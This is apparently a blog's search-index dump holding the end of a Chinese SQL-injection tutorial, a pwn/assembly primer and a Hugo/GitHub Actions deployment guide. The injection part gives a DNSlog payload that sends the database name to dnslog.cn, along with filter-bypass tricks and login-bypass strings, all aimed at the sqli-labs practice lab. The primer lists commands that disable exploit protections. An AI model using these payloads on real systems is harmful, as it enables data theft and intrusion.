并不会被带到数据库中 二次urldecode注入 单引号：%25%27\n双引号：%25%22\nDNS_log注入 原理 通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。 DNSLOG的使用场景 在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把想获得的数据外带出来。 对于sql盲注，常见的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。 所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。 DNS_log函数解析: 读取文件并返回文件内容为字符串。 要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。 以sql-labs Less-8为例子：\n可以输入以下payload:http://172.16.11.54/sqli-labs/Less-8/?id=1' and load_file(concat(\u0026quot;\\\\\\\\\u0026quot;,database(),\u0026quot;.uifm3e.dnslog.cn\\\\xxx.txt\u0026quot;))--+\n绕过 空格 多层括号嵌套 改用+号 使用注释代替（/注释内容/、/! MYSQL专属/） and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略 %09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格 单双引号 需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。 不需要跳出单引号的情况：字符串可用16进制表示、也可通过进制转换函数表示成其他进制。 1 2 3 4 -- hex 编码 SELECT * FROM Users WHERE username = 0x61646D696E -- char() 函数 SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) 逗号 采用 substr((database())from({})for(1)) 的形式 采用join：union select * from ((select 1)a join (select 2)b join (select 3)c); 等号 like 用regexp或者in \u0026lt;\u0026gt; and / or 双写anandd、oorr 使用运算符代替\u0026amp;\u0026amp;、|| 直接拼接=号，如：?id=1=(condition) 其他方法，如：?id=1^(condition)、?id=1)xor(condition) union 盲注：'and(select pass from users limit 1)='secret ","permalink":"http://www.reus09.top/posts/tech/sql%E6%B3%A8%E5%85%A5/","summary":"这篇文章主要想对web注入的方式进行一个梳理总结，主要通过靶场sqli-labs进行。 [TOC] 万能密码 1 2 3 4 5 6 7 8 9 admin\u0026#39; -- admin\u0026#39; # admin\u0026#39;/\\* \u0026#39; or 1=1-- \u0026#39; or 1=1# \u0026#39; or","title":"Sql注入"},{"content":"大四了，最近一直在摆烂，因为之前学习过一点pwn的基础，最近也是再重新回顾一下，了解一下二进制安全。\n逆向基础 amd64: 64位 AMD64，或“x64”，是一种64位元的电脑处理器架构。它是基于现有32位元的x86架构 i386：—— intel 80386 32位， 通常作为intel32位微处理器（cpu）的统称。 因为32位指令集具有普适，所以这里主要讲述x86-32版本的汇编语言。\nx64 体系结构是 x86 的向后兼容扩展。 它提供与 x86 相同的旧 32 位模式，以及新的 64 位模式。\n基础汇编指令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 MOV EAX,ECX EAX = ECX ADD EAX,ECX EAX+=ECX SUB EAX,ECX EAX-=ECX INC EAX EAX++ DEC EAX\tEAX— LEA EAX,[ECX+4] EAX = ECX+4 CMP EAX,ECX if(EAX == ECX) ZF = 1 else ZF = 0 TEST EAX,EAX if(EAX == 0) ZF = 1 else ZF = 0 JE(JZ) 04001000 if（ZF == 1） GOTO 04001000 JNE(JNZ) 04001000 if(ZF == 0) GOTO 04001000 JMP 04001000 GOTO 04001000 CALL XXX 调用xxx PUSH 0000001 将0000001入栈 POP EAX 出栈并将获取的值存入EAX 寄存器分类 32位寄存器共有16个\n数据寄存器 数据寄存器主要用来保存操作数和运算结果等信息，从而节省读取操作数所需占用总线和访问存储器的时间。\n4个32位通用寄存器：EAX、EBX、ECX和EDX。对低16位数据的取存，不会影响高16 位的数据，这些低16位寄存器分别命名为AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。 4个16位寄存器又可分割成8个独立的8位寄存器（AX：ah~al、BX：bh~bl、CX：ch~cl：DX：dh~dl） AX和al—累加器 可用于乘/除、输入/输出等 BX—基址寄存器 可作为存储指针使用 CX—计数寄存器 循环和字符串操作时，用来控制循环次数 移多位时，要用cl来指明位移的位数 DX—数据寄存器，乘除运算时可作为默认操作数参与运算，也可存放I/O端口地址\n在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址，但在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据、保存算术逻辑运算结果，而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性。\n变址寄存器 ESI,EDI\n它们主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式，为以不同的地址形式访问存储单元提供方便。\n指针寄存器 ESP, EBP\n主要存放堆栈内存储单元的偏移量。\nESP为栈顶，EBP为栈底\n段寄存器 段寄存器是根据内存分段的管理模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问较大物理空间的内存地址。\n六个段寄存器如下:\n1 2 3 CS：代码段寄存器 ES：附加段寄存器 DS：数据段寄存器 FS：附加段寄存器 SS：堆栈段寄存器 GS：附件段寄存器 主要了解：CS,DS,SS\n指令指针寄存器 EIP:存放下次将要执行的指令在代码段的偏移地址，在具有预取指令功能的系统中，下次要执行的指令通常已被预取到指令队列中，除非发生转移情况，所以，在理解它们的功能时不考虑存在指令队列的情况。\n理解的话就是存取当运行当前指令时下一步要执行指令的地址。\n标志寄存器 EFlags:\n运算结果标志位。一共6个，包括：CF进位标志位、PF奇偶标志位、AF辅助进位标志位、ZF零标志位、SF符号标志位、OF溢出标志位。 记忆阅读也较为简单：CF = Carry Flag , PF = Parity Flag , AF = Auxillary Carry Flag , ZF = zero Flag , SF = sign Flag, OF = overFlow Flag 状态控制标志位。一共3个，包括：TF追踪标志位、IF中断允许标志位、DF方向标志位。 数据机构 栈 栈是一个先入后出（First In Last Out(FIFO)）的容器。用于存放函数返回地址及参数、临时变量和有关上下文的内容。程序在调用函数时，操作系统会自动通过压栈和弹栈完成保存函数现场等操作，不需要程序员手动干预。\n栈由高地址向低地址增长，栈保存了一个函数调用所需要的维护信息，称为堆栈帧（Stack Frame）在 x86 体系中，寄存器 ebp 指向堆栈帧的底部，esp 指向堆栈帧的顶部。压栈时栈顶地址减小，弹栈时栈顶地址增大。\nPUSH：用于压栈。将 esp 减 4，然后将其唯一操作数的内容写入到 esp 指向的内存地址 POP ：用于弹栈。从 esp 指向的内存地址获得数据，将其加载到指令操作数（通常是一个寄存器）中，然后将 esp 加 4。 x86 体系下函数的调用总是这样的：\n把所有或一部分参数压入栈中，如果有其他参数没有入栈，那么使用某些特定的寄存器传递。 把当前指令的下一条指令的地址压入栈中。 跳转到函数体执行。 其中第 2 步和第 3 步由指令 call 一起执行。跳转到函数体之后即开始执行函数，而 x86 函数体的开头是这样的：\npush ebp：把ebp压入栈中（old ebp）。 mov ebp, esp：ebp=esp（这时ebp指向栈顶，而此时栈顶就是old ebp） [可选] sub esp, XXX：在栈上分配 XXX 字节的临时空间。 [可选] push XXX：保存名为 XXX 的寄存器。 这里其实相当于生成新的栈帧 把ebp压入栈中，是为了在函数返回时恢复以前的ebp值，而压入寄存器的值，是为了保持某些寄存器在函数调用前后保存不变。函数返回时的操作与开头正好相反：\n[可选] pop XXX：恢复保存的寄存器。 mov esp, ebp：恢复esp同时回收局部变量空间。 pop ebp：恢复保存的ebp的值。 ret：从栈中取得返回地址，并跳转到该位置。 栈帧对应的汇编代码:\n1 2 3 4 5 6 7 PUSH ebp ; 函数开始（使用ebp前先把已有值保存到栈中） MOV ebp, esp ; 保存当前esp到ebp中 ... ; 函数体 ; 无论esp值如何变化，ebp都保持不变，可以安全访问函数的局部变量、参数 MOV esp, ebp ; 将函数的其实地址返回到esp中 POP ebp ; 函数返回前弹出保存在栈中的ebp值 RET ; 函数返回并跳转 函数调用后栈的标准布局如下图：\n这里通过一个demo来进行调试：\n1 2 3 4 5 6 7 8 9 10 #include\u0026lt;stdio.h\u0026gt; int add(int a, int b) { int x = a, y = b; return (x + y); } int main() { int a = 1, b = 2; printf(\u0026#34;%d\\n\u0026#34;, add(a, b)); return 0; } gcc demo.c -m32 -debug -o demo编译生成32位程序\n使用 gdb-pead 查看对应的main和add两个函数的，这里我们给出了详细的注释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 gdb-peda$ disassemble main Dump of assembler code for function main: 0x00000563 \u0026lt;+0\u0026gt;: lea ecx,[esp+0x4] ;将 esp+0x4 的地址传给 ecx 0x00000567 \u0026lt;+4\u0026gt;: and esp,0xfffffff0 ;栈 16 字节对齐 0x0000056a \u0026lt;+7\u0026gt;: push DWORD PTR [ecx-0x4] ;ecx-0x4，即原 esp 强制转换为双字数据后压入栈中 0x0000056d \u0026lt;+10\u0026gt;: push ebp ;保存调用 main() 函数之前的 ebp，由于在 _start 中将 ebp 清零了，这里的 ebp=0x0 0x0000056e \u0026lt;+11\u0026gt;: mov ebp,esp ;把调用 main() 之前的 esp 作为当前栈帧的 ebp 0x00000570 \u0026lt;+13\u0026gt;: push ebx ;ebx、ecx 入栈 0x00000571 \u0026lt;+14\u0026gt;: push ecx 0x00000572 \u0026lt;+15\u0026gt;: sub esp,0x10 ;为局部变量 a、b 分配空间并做到 16 字节对齐 0x00000575 \u0026lt;+18\u0026gt;: call 0x440 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; ;调用 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 函数，将 esp 强制转换为双字数据后保存到 ebx 0x0000057a \u0026lt;+23\u0026gt;: add ebx,0x1a86 ;ebx+0x1a86 0x00000580 \u0026lt;+29\u0026gt;: mov DWORD PTR [ebp-0x10],0x1 ;a 第二个入栈所以保存在 ebp-0x10 的位置，此句即 a=1 0x00000587 \u0026lt;+36\u0026gt;: mov DWORD PTR [ebp-0xc],0x2 ;b 第一个入栈所以保存在 ebp-0xc 的位置，此句即 b=2 0x0000058e \u0026lt;+43\u0026gt;: push DWORD PTR [ebp-0xc] ;将 b 压入栈中 0x00000591 \u0026lt;+46\u0026gt;: push DWORD PTR [ebp-0x10] ;将 a 压入栈中 0x00000594 \u0026lt;+49\u0026gt;: call 0x53d \u0026lt;add\u0026gt; ;调用 add() 函数，返回值保存在 eax 中 0x00000599 \u0026lt;+54\u0026gt;: add esp,0x8 ;清理 add() 的参数 0x0000059c \u0026lt;+57\u0026gt;: sub esp,0x8 ;调整 esp 使 16 位对齐 0x0000059f \u0026lt;+60\u0026gt;: push eax ;eax 入栈 0x000005a0 \u0026lt;+61\u0026gt;: lea eax,[ebx-0x19b0] ;ebx-0x19b0 的地址保存到 eax，该地址处保存字符串 \u0026#34;%d\\n\u0026#34; 0x000005a6 \u0026lt;+67\u0026gt;: push eax ;eax 入栈 0x000005a7 \u0026lt;+68\u0026gt;: call 0x3d0 \u0026lt;printf@plt\u0026gt; ;调用 printf() 函数 0x000005ac \u0026lt;+73\u0026gt;: add esp,0x10 ;调整栈顶指针 esp，清理 printf() 的参数 0x000005af \u0026lt;+76\u0026gt;: mov eax,0x0 ;eax=0x0 0x000005b4 \u0026lt;+81\u0026gt;: lea esp,[ebp-0x8] ;ebp-0x8 的地址保存到 esp 0x000005b7 \u0026lt;+84\u0026gt;: pop ecx ;弹栈恢复 ecx、ebx、ebp 0x000005b8 \u0026lt;+85\u0026gt;: pop ebx 0x000005b9 \u0026lt;+86\u0026gt;: pop ebp 0x000005ba \u0026lt;+87\u0026gt;: lea esp,[ecx-0x4] ;ecx-0x4 的地址保存到 esp 0x000005bd \u0026lt;+90\u0026gt;: ret ;返回，相当于 pop eip; End of assembler dump. gdb-peda$ disassemble add Dump of assembler code for function add: 0x0000053d \u0026lt;+0\u0026gt;: push ebp ;保存调用 add() 函数之前的 ebp 0x0000053e \u0026lt;+1\u0026gt;: mov ebp,esp ;把调用 add() 之前的 esp 作为当前栈帧的 ebp 0x00000540 \u0026lt;+3\u0026gt;: sub esp,0x10 ;为局部变量 x、y 分配空间并做到 16 字节对齐 0x00000543 \u0026lt;+6\u0026gt;: call 0x5be \u0026lt;__x86.get_pc_thunk.ax\u0026gt; ;调用 \u0026lt;__x86.get_pc_thunk.ax\u0026gt; 函数，将 esp 强制转换为双字数据后保存到 eax 0x00000548 \u0026lt;+11\u0026gt;: add eax,0x1ab8 ;eax+0x1ab8 0x0000054d \u0026lt;+16\u0026gt;: mov eax,DWORD PTR [ebp+0x8] ;将 ebp+0x8 的数据 0x1 传送到 eax，ebp+0x4 为函数返回地址 0x00000550 \u0026lt;+19\u0026gt;: mov DWORD PTR [ebp-0x8],eax ;保存 eax 的值 0x1 到 ebp-0x8 的位置 0x00000553 \u0026lt;+22\u0026gt;: mov eax,DWORD PTR [ebp+0xc] ;将 ebp+0xc 的数据 0x2 传送到 eax 0x00000556 \u0026lt;+25\u0026gt;: mov DWORD PTR [ebp-0x4],eax ;保存 eax 的值 0x2 到 ebp-0x4 的位置 0x00000559 \u0026lt;+28\u0026gt;: mov edx,DWORD PTR [ebp-0x8] ;取出 ebp-0x8 的值 0x1 到 edx 0x0000055c \u0026lt;+31\u0026gt;: mov eax,DWORD PTR [ebp-0x4] ;取出 ebp-0x4 的值 0x2 到 eax 0x0000055f \u0026lt;+34\u0026gt;: add eax,edx ;eax+edx 0x00000561 \u0026lt;+36\u0026gt;: leave ;返回，相当于 mov esp,ebp; pop ebp; 0x00000562 \u0026lt;+37\u0026gt;: ret End of assembler dump. 由于 ELF 文件的入口其实是 _start 而不是 main()，所以我们还应该关注下面的函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 gdb-peda$ disassemble _start Dump of assembler code for function _start: 0x00000400 \u0026lt;+0\u0026gt;: xor ebp,ebp ;清零 ebp，表示下面的 main() 函数栈帧中 ebp 保存的上一级 ebp 为 0x00000000 0x00000402 \u0026lt;+2\u0026gt;: pop esi ;将 argc 存入 esi 0x00000403 \u0026lt;+3\u0026gt;: mov ecx,esp ;将栈顶地址（argv 和 env 数组的其实地址）传给 ecx 0x00000405 \u0026lt;+5\u0026gt;: and esp,0xfffffff0 ;栈 16 字节对齐 0x00000408 \u0026lt;+8\u0026gt;: push eax ;eax、esp、edx 入栈 0x00000409 \u0026lt;+9\u0026gt;: push esp 0x0000040a \u0026lt;+10\u0026gt;: push edx 0x0000040b \u0026lt;+11\u0026gt;: call 0x432 \u0026lt;_start+50\u0026gt; ;先将下一条指令地址 0x00000410 压栈，设置 esp 指向它，再调用 0x00000432 处的指令 0x00000410 \u0026lt;+16\u0026gt;: add ebx,0x1bf0 ;ebx+0x1bf0 0x00000416 \u0026lt;+22\u0026gt;: lea eax,[ebx-0x19d0] ;取 \u0026lt;__libc_csu_fini\u0026gt; 地址传给 eax，然后压栈 0x0000041c \u0026lt;+28\u0026gt;: push eax 0x0000041d \u0026lt;+29\u0026gt;: lea eax,[ebx-0x1a30] ;取 \u0026lt;__libc_csu_init\u0026gt; 地址传入 eax，然后压栈 0x00000423 \u0026lt;+35\u0026gt;: push eax 0x00000424 \u0026lt;+36\u0026gt;: push ecx ;ecx、esi 入栈保存 0x00000425 \u0026lt;+37\u0026gt;: push esi 0x00000426 \u0026lt;+38\u0026gt;: push DWORD PTR [ebx-0x8] ;调用 main() 函数之前保存返回地址，其实就是保存 main() 函数的入口地址 0x0000042c \u0026lt;+44\u0026gt;: call 0x3e0 \u0026lt;__libc_start_main@plt\u0026gt; ;call 指令调用 __libc_start_main 函数 0x00000431 \u0026lt;+49\u0026gt;: hlt ;hlt 指令使程序停止运行，处理器进入暂停状态，不执行任何操作，不影响标志。当 RESET 线上有复位信号、CPU 响应非屏蔽终端、CPU 响应可屏蔽终端 3 种情况之一时，CPU 脱离暂停状态，执行下一条指令 0x00000432 \u0026lt;+50\u0026gt;: mov ebx,DWORD PTR [esp] ;esp 强制转换为双字数据后保存到 ebx 0x00000435 \u0026lt;+53\u0026gt;: ret ;返回，相当于 pop eip; 0x00000436 \u0026lt;+54\u0026gt;: xchg ax,ax ;交换 ax 和 ax 的数据，相当于 nop 0x00000438 \u0026lt;+56\u0026gt;: xchg ax,ax 0x0000043a \u0026lt;+58\u0026gt;: xchg ax,ax 0x0000043c \u0026lt;+60\u0026gt;: xchg ax,ax 0x0000043e \u0026lt;+62\u0026gt;: xchg ax,ax End of assembler dump. 函数调用约定 函数调用约定是对函数调用时如何传递参数的一种约定。调用函数前要先把参数压入栈然后再传递给函数。\n一个调用约定大概有如下的内容：\n函数参数的传递顺序和方式 栈的维护方式 名字修饰的策略 主要的函数调用约定如下，其中 cdecl 是 C 语言默认的调用约定：\n调用约定 出栈方 参数传递 名字修饰 cdecl 函数调用方 从右到左的顺序压参数入栈 下划线＋函数名 stdcall 函数本身 从右到左的顺序压参数入栈 下划线＋函数名＋@＋参数的字节数 fastcall 函数本身 都两个 DWORD（4 字节）类型或者占更少字节的参数被放入寄存器，其他剩下的参数按从右到左的顺序压入栈 @＋函数名＋@＋参数的字节数 除了参数的传递之外，函数与调用方还可以通过返回值进行交互。当返回值不大于 4 字节时，返回值存储在 eax 寄存器中，当返回值在 5~8 字节时，采用 eax 和 edx 结合的形式返回，其中 eax 存储低 4 字节， edx 存储高 4 字节。\n堆 关于堆的比较复杂，暂且稍后再补充。\n常见保护 我们可以通过checksec命令来查看文件开启哪些保护\nRELRO Relocation Read-Only (RELRO) 可以使程序某些部分成为只读的。它分为两种，Partial RELRO 和 Full RELRO，即部分RELRO 和 完全RELRO。\n部分RELRO 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。\n完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。\nCanary stack canary 表示栈的报警保护：在函数返回值之前添加的一串随机数（不超过机器字长），末位为/x00（提供了覆盖最后一字节输出泄露canary的可能），如果出现缓冲区溢出攻击，覆盖内容覆盖到canary处，就会改变原本该处的数值，当程序执行到此处时，会检查canary值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。\nNX 即No-eXecute(不可执行)，**NX(DEP)**的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。攻击者意图通过栈溢出使局部变量覆盖返回地址，然后加入shellcode，而防御者则利用NX策略是使栈区域的代码无法执行。\n当NX保护开启，就表示题目提供了system（‘/bin/sh’)，如果关闭，则要自己构造shellcode\nPIE PIE(ASLR），即内存地址随机化机制（address space layout randomization），有以下三种情况:\n1 2 3 4 5 0-关闭进程地址空间随机化 1-将mmap的基址，stack和vsdo页面随机化 2-在1的基础上 增加栈（heap）的随机化 该保护使每次运行程序的地址都不同，防止根据固定地址写exp执行攻击\nliunx下关闭PIE的命令如下：sudo -s echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\n关闭上述选项的命令:\ngcc -no-pie -fno-stack-protector -z execstack -m32 -o exp1 exp1.c\nFORTIFY FORTIFY_SOURCE机制，在编译时检查源码是否存在缓冲区溢出等错误。gcc生成一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。\n","permalink":"http://www.reus09.top/posts/tech/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","summary":"大四了，最近一直在摆烂，因为之前学习过一点pwn的基础，最近也是再重新回顾一下，了解一下二进制安全。 逆向基础 amd64: 64位 AMD64，或“x64”","title":"Pwn基础知识"},{"content":"最近阿里云服务器到期，服务太贵了，所以就想着继续使用github作为博客搭建的方法。以前使用hexo作为静态博客工具。最近了解了一下hugo,发现Hugo的主题Hugo-PaperMod挺好看的，就了解了一下，并且结合github action 实现自动化部署。并从中学习到了一些git的命令，稍后也做一个整理便于加深印象。\nHugo-PaperMod 安装Hugo mac 环境直接brew install hugo即可安装hugo\n创建网站 命令hugo new site myblog可以建立站点\n目录如下：\n1 2 3 4 5 6 7 8 9 10 11 . ├── archetypes │ └── default.md // 这里是模版文件 ├── config.toml // 这里是配置文件 ├── content // 这里是文件内容 ├── data ├── layouts ├── static └── themes 6 directories, 2 files toml配置文件也可以改为yaml格式。\n配置主题 在themes下直接git clone git@github.com:adityatelange/hugo-PaperMod.git\n然后可以编写config.yaml文件了，需要注意的是需要把主题换为自己选择的主题:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 baseURL: http://www.reus09.top # baseURL: https://www.sulvblog.cn # 绑定的域名 languageCode: zh-cn # en-us title: Reus09\u0026#39;s Blog theme: hugo-PaperMod # 主题名字，和themes文件夹下的一致 enableInlineShortcodes: true enableEmoji: true # 允许使用 Emoji 表情，建议 true enableRobotsTXT: true # 允许爬虫抓取到搜索引擎，建议 true hasCJKLanguage: true # 自动检测是否包含 中文日文韩文 如果文章中使用了很多中文引号的话可以开启 buildDrafts: false buildFuture: false buildExpired: false #googleAnalytics: UA-123-45 # 谷歌统计 # Copyright: Sulv paginate: 10 # 首页每页显示的文章数 minify: disableXML: true # minifyOutput: true permalinks: post: \u0026#34;/:title/\u0026#34; # post: \u0026#34;/:year/:month/:day/:title/\u0026#34; defaultContentLanguage: en # 最顶部首先展示的语言页面 defaultContentLanguageInSubdir: true languages: en: languageName: \u0026#34;English\u0026#34; # contentDir: content/english weight: 1 profileMode: enabled: true title: (〃\u0026#39;▽\u0026#39;〃) subtitle: \u0026#34;修炼日记\u0026#34; imageUrl: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; imageTitle: imageWidth: 150 imageHeight: 150 buttons: - name: 👨🏻‍💻技术 url: posts/tech - name: 📕阅读 url: posts/read - name: 🏖生活 url: posts/life menu: main: - identifier: search name: 🔍搜索 url: search weight: 1 - identifier: home name: 🏠主页 url: / weight: 2 - identifier: posts name: 📚文章 url: posts weight: 3 # - identifier: tech # name: 👨🏻‍💻技术文章 # url: posts/tech # weight: 5 # - identifier: life # name: 🏖记录生活 # url: posts/life # weight: 6 - identifier: archives name: ⏱时间轴 url: archives/ weight: 20 # - identifier: categories # name: 🧩分类 # url: categories # weight: 30 - identifier: tags name: 🔖标签 url: tags weight: 40 - identifier: about name: 🙋🏻‍♂️关于 url: about weight: 50 - identifier: links name: 🤝友链 url: links weight: 60 outputs: home: - HTML - RSS - JSON params: env: production # to enable google analytics, opengraph, twitter-cards and schema. # description: \u0026#34;这是一个纯粹的博客......\u0026#34; author: Reus09 # author: [\u0026#34;Me\u0026#34;, \u0026#34;You\u0026#34;] # multiple authors ShowAllPagesInArchive: true defaultTheme: auto # defaultTheme: light or dark disableThemeToggle: false DateFormat: \u0026#34;2006-01-02\u0026#34; ShowShareButtons: true ShowReadingTime: true # disableSpecialistPost: true displayFullLangName: true ShowPostNavLinks: true ShowBreadCrumbs: true ShowCodeCopyButtons: true hideFooter: false # 隐藏页脚 ShowWordCounts: true VisitCount: true ShowLastMod: true #显示文章更新时间 ShowToc: true # 显示目录 TocOpen: true # 自动展开目录 comments: true socialIcons: - name: github url: \u0026#34;https://github.com/xyming108\u0026#34; - name: twitter url: \u0026#34;img/twitter.png\u0026#34; - name: facebook url: \u0026#34;https://www.facebook.com/profile.php?id=100027782410997\u0026#34; - name: instagram url: \u0026#34;img/instagram.png\u0026#34; - name: QQ url: \u0026#34;img/qq.png\u0026#34; - name: WeChat url: \u0026#34;img/wechat.png\u0026#34; # - name: Phone # url: \u0026#34;img/phone.png\u0026#34; - name: email url: \u0026#34;mailto:1931559710@qq.com\u0026#34; - name: RSS url: \u0026#34;index.xml\u0026#34; # editPost: # URL: \u0026#34;https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content\u0026#34; # Text: \u0026#34;Suggest Changes\u0026#34; # edit text # appendFilePath: true # to append file path to Edit link # label: # text: \u0026#34;Home\u0026#34; # icon: icon.png # iconHeight: 35 # analytics: # google: # SiteVerificationTag: \u0026#34;XYZabc\u0026#34; assets: favicon: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; favicon16x16: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; favicon32x32: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; apple_touch_icon: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; safari_pinned_tab: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; # cover: # hidden: true # hide everywhere but not in structured data # hiddenInList: true # hide on list pages and home # hiddenInSingle: true # hide on single page fuseOpts: isCaseSensitive: false shouldSort: true location: 0 distance: 1000 threshold: 1 minMatchCharLength: 0 keys: [\u0026#34;title\u0026#34;, \u0026#34;permalink\u0026#34;, \u0026#34;summary\u0026#34;] twikoo: version: 1.4.11 taxonomies: category: categories tag: tags series: series markup: goldmark: renderer: unsafe: true # HUGO 默认转义 Markdown 文件中的 HTML 代码，如需开启的话 highlight: # anchorLineNos: true codeFences: true guessSyntax: true lineNos: true # noClasses: false # style: monokai style: darcula # codeFences：代码围栏功能，这个功能一般都要设为 true 的，不然很难看，就是干巴巴的-代码文字，没有颜色。 # guessSyntax：猜测语法，这个功能建议设置为 true, 如果你没有设置要显示的语言则会自动匹配。 # hl_Lines：高亮的行号，一般这个不设置，因为每个代码块我们可能希望让高亮的地方不一样。 # lineNoStart：行号从编号几开始，一般从 1 开始。 # lineNos：是否显示行号，我比较喜欢显示，所以我设置的为 true. # lineNumbersInTable：使用表来格式化行号和代码,而不是 标签。这个属性一般设置为 true. # noClasses：使用 class 标签，而不是内嵌的内联样式 privacy: vimeo: disabled: false simple: true twitter: disabled: false enableDNT: true simple: true instagram: disabled: false simple: true youtube: disabled: false privacyEnhanced: true services: instagram: disableInlineCSS: true twitter: disableInlineCSS: true hugo 常用的命令:\nhugo server -D 本地演示 hugo new xxx/xxx.md 这里的xxx为content下面的目录下面的文档 hugo 生成静态文件 Github Action 配置以及联合域名解析 github操作 这里我们创建两个仓库，一个私有库存储博客源码，一个公开库，即xxxx.github.io.存储我们的博客静态网页。\n这里私有库 : blog public : reus09.github.io 配置tocken,因为我们需要从博客仓库推送到外部 GitHub Pages 仓库，需要特定权限，要在 GitHub 账户下 Setting - Developer setting - Personal access tokens 下创建一个 Token。需要开启权限repo和workflow\n配置后复制生成的 Token（注：只会出现一次），然后在我们博客源仓库(blog)的 Settings - Secrets - Actions 中添加 PERSONAL_TOKEN 环境变量为刚才的 Token，这样 GitHub Action 就可以获取到 Token 了。\n阿里云域名解析 制定记录类型为CNAME,然后主机记录分别为@和www，记录值为reus09.github.io，这里就是你的github博客地址，也可以通过ping xxxx.github.io 来获取其对应的真实IP地址。\ngit操作 在hugo初始的site:myblog下:\ngit init 初始化git仓库\n在myblog目录下建立.github/workflows/deploy.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 name: deploy on: push: workflow_dispatch: schedule: # Runs everyday at 8:00 AM - cron: \u0026#34;0 0 * * *\u0026#34; jobs: build: runs-on: ubuntu-20.04 steps: - name: Checkout uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#34;latest\u0026#34; - name: Build Web run: hugo - name: Deploy Web uses: peaceiris/actions-gh-pages@v3 with: # 这里即为 我们上文中为 blog 生成的secret PERSONAL_TOKEN: ${{ secrets.PERSONAL_TOKEN }} # 这里指向自己的githubo 博客地址 EXTERNAL_REPOSITORY: reus09/reus09.github.io PUBLISH_BRANCH: master PUBLISH_DIR: ./public # 指定 CNAME CNAME: www.reus09.top commit_message: ${{ github.event.head_commit.message }} on 表示 GitHub Action 触发条件，我设置了 push、workflow_dispatch 和 schedule 三个条件：\npush，当这个项目仓库发生推送动作后，执行 GitHub Action workflow_dispatch，可以在 GitHub 项目仓库的 Action 工具栏进行手动调用 schedule，定时执行 GitHub Action，如我的设置为北京时间每天早上执行，主要是使用一些自动化统计 CI 来自动更新我博客的关于页面，如本周编码时间，影音记录等，如果你不需要定时功能，可以删除这个条件 jobs 表示 GitHub Action 中的任务，我们设置了一个 build 任务，runs-on 表示 GitHub Action 